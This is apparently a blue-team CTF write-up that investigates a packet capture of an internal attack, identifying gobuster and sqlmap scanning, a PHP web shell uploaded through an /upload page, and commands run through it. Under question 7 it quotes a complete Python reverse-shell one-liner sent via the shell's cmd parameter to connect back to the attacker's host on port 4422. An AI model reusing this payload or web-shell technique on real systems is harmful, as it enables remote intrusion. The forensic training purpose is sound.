#ctf
## Scenario

The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

### Resources

- [PCAP File Download](https://blueteamlabs.online/storage/files/DdMgCqiLCvTxMd6XYQgaXCyjDH8M6b.zip)  
    **Password**: `btlo`  
    ![[DdMgCqiLCvTxMd6XYQgaXCyjDH8M6b.zip]]  
    ![[BTLOPortScan.pcap]]

## Playbook
Tool:
- wireshark
- SIEM
### 1. What is the suspicious/unknown IP?

- **Suspicious IP**: `10.251.96.4`  
    ![[{BCBCDBD4-0409-4AB0-8A3D-979DBE06556F}.png]]  
    ![[{96AC4C5D-8280-48E4-91CC-F3024C5BE6F4}.png]]  
    _There were numerous requests from 10.251.96.4 to 10.251.96.5._

### 2. Which system was attacked?

- **Target System**: `10.251.96.5`

### 3. What ports were attacked?

- Ports: `80 (HTTP)` and `443 (HTTPS)`

### 4. What tool was used?

- **Gobuster** (v3.0.1) for directory brute-forcing.  
    _User-Agent_: `gobuster`  
    ![[{659BCB8F-482A-49ED-BD3E-8FF3FA496EBA}.png]]
    
- **Sqlmap** for SQL injection testing.  
    _User-Agent_: `sqlmap`  
    ![[{51A7CB94-ACE5-4DDF-B940-E056C35C45AB}.png]]
    

### 5. What protocol was used?

- **HTTP/HTTPS**
- **TCP SYN** scans

### 6. What exploit was used?

- The `/upload` functionality was exploited to upload a file, which was later used to gain a web shell.
    
- **Malicious File**: `dbfunction.php`  
    ![[{A57541B8-0086-4A8C-B65C-8A954689C6C8}.png]]
    
- **Reverse Shell Attempt**:  
    File `dbfunction.php` was accessed with a `cmd` parameter for remote command execution.  
    ![[{5863F3B5-62C2-4FB2-98FF-01B463E4A4F3}.png]]
    
    Example commands like `id` and `whoami` were run from the shell.
    

---

### 7. Was the exploit successful?

Yes, the exploit succeeded. The attacker gained access through a reverse shell.

```http
GET /uploads/dbfunctions.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' HTTP/1.1

```
- **Successful Reverse Shell** on port `4422` to IP `10.251.96.4`.

---

### 8. Did they gain access to the internal network?

Yes, the attacker gained internal network access—they already had internal network access, which was leveraged for further attacks.
